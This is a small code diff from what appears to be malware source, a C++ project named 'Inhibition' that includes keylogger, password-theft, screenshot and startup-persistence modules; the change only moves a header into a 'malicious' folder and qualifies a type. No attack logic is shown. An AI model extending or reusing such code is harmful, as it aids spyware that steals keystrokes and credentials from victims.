@@ -7,8 +7,8 @@
 #include <malicious/Keylogger.hpp>
 #include <malicious/Passwords.hpp>
 #include <malicious/Screenshot.hpp>
+#include <malicious/ProgramStart.hpp>
 #include "CommandDispatcher.hpp"
-#include "ProgramStart.hpp"
 
 namespace Inhibition
 {
@@ -43,7 +43,7 @@ namespace Inhibition
             std::string dllPath;
             std::string keylogPath;
             std::string installPath;
-			ProgramStartupKey startup;
+			Malicious::ProgramStartupKey startup;
     };
     
 } // Inhibition
